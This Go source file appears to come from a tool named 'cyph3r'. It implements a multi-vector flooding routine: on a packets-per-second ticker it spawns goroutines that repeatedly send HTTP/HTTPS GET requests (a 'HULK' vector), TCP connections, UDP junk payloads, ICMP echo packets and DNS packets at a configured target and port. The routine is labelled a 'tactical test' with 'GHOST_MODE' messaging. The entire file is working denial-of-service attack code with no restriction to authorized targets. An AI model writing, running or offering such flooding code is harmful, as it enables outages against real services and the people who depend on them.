package intel

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"time"

	"github.com/AnonPhoenix420/cyph3r/internal/models"
	"github.com/AnonPhoenix420/cyph3r/internal/output"
)

func RunTacticalTest(cfg models.TacticalConfig, ctx context.Context) {
	fmt.Printf("\n%s[GHOST_MODE] ENGAGING %s ON PORT %s -> %s%s\n", output.NeonPink, cfg.Vector, cfg.Port, cfg.Target, output.Reset)
	
	ticker := time.NewTicker(time.Second / time.Duration(cfg.PPS))
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			fmt.Printf("\n%s[+] Mission complete.%s\n", output.NeonGreen, output.Reset)
			return
		case <-ticker.C:
			for i := 0; i < 25; i++ { 
				go executeVector(cfg)
			}
		}
	}
}

func executeVector(cfg models.TacticalConfig) {
	addr := net.JoinHostPort(cfg.Target, cfg.Port)

	switch cfg.Vector {
	case "HULK", "HTTPS", "HTTP":
		client := &http.Client{Timeout: 1 * time.Second}
		protocol := "https://"
		if cfg.Vector == "HTTP" { protocol = "http://" }
		req, _ := http.NewRequest("GET", protocol+addr, nil)
		resp, err := client.Do(req)
		if err == nil { resp.Body.Close() }

	case "SYN", "TCP":
		d := net.Dialer{Timeout: 500 * time.Millisecond}
		conn, err := d.Dial("tcp", addr)
		if err == nil { conn.Close() }

	case "UDP":
		conn, _ := net.Dial("udp", addr)
		if conn != nil { 
			conn.Write(make([]byte, 1024))
			conn.Close() 
		}

	case "ACK":
		conn, _ := net.Dial("tcp", addr)
		if conn != nil { 
			conn.Write([]byte("ACK"))
			conn.Close() 
		}

	case "ICMP":
		conn, _ := net.Dial("ip4:icmp", cfg.Target)
		if conn != nil {
			conn.Write([]byte{8, 0, 0, 0, 0, 0, 0, 0})
			conn.Close()
		}

	case "DNS":
		conn, _ := net.Dial("udp", cfg.Target+":53")
		if conn != nil {
			conn.Write([]byte{0x24, 0x1a, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00})
			conn.Close()
		}
	}
}
